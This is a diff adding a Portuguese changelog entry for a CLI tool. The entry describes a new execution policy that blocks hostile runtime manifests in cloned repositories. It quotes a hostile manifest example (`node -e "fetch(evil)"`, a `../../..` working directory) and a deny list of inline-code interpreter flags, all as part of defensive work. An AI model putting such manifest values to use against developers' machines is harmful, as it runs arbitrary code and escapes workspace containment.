@@ -1,5 +1,33 @@
 # Changelog - gstack-vibehard
 
+## [5.4.0] - 2026-07-17 — PRD45 S45.2: policy de execução + contenção do Runtime Manifest
+
+Sprint 45.2 — fecha o achado P1.2: um repositório **clonado** não executa mais comando
+arbitrário ao rodar `dev`. A validação anterior do manifest só checava estrutura (`command` é
+array de strings), então `["node","-e","fetch(evil)"]` e `cwd:"../../.."` passavam direto para
+o `spawn`. `shell:false` não elimina esse vetor.
+
+- **Novo `src/runtime/exec-policy.js`** — camada de confiança **antes** do spawn:
+  - `classifyCommand` — **deny** para interpretador com flag de código **inline** (`node -e`,
+    `python -c`, `powershell -Command`, `bash -c`, `cmd /c`…); **allow** para runner de projeto
+    (`npm`/`pnpm`/`yarn`/`concurrently`/`turbo`/`nx`) e interpretador rodando **arquivo**
+    (`node server.js`); **ask** para binário fora da allowlist (caminho absoluto/desconhecido).
+  - `resolveContainedCwd` — resolve por **realpath** e exige contenção no workspace, pegando
+    **symlink/junction** que escapa (o `assertWithin` existente usava resolve lógico).
+  - `manifestTrustDigest` — sha256 canônico (estável à ordem de chaves); mudou ⇒ re-trust.
+  - `evaluateManifestExec` — gate **fail-closed**. `deny`/escape nunca passam; `ask` só passa
+    com o trust do **digest exato**. Persistência em `.gstack/runtime-trust.json`;
+    **`dev --trust`** aprova o conteúdo atual (override auditado). `deny`/escape não são
+    destraváveis por trust.
+  - Ligado ao `dev`: manifest hostil é **bloqueado antes de qualquer spawn**.
+
+Nota de não-regressão: o gate foi validado contra os manifests que o **próprio `create`** gera.
+O template com `concurrently` cairia em `ask` e quebraria o `dev` de projeto novo — por isso
+`concurrently`/`turbo`/`nx` entraram nos runners de projeto, travado por um teste de regressão
+permanente. O E2E que usava binário inexistente foi reescrito para preservar sua intenção
+(spawn falho não derruba o CLI) e ganhou um par que prova que `node -e` malicioso é barrado
+antes de qualquer efeito colateral.
+
 ## [5.3.0] - 2026-07-17 — PRD45 S45.1: supervisor seguro + ownership de PID fail-closed
 
 Sprint 45.1 — fecha os dois achados de segurança do supervisor de runtime (P0.2 e P1.1). O
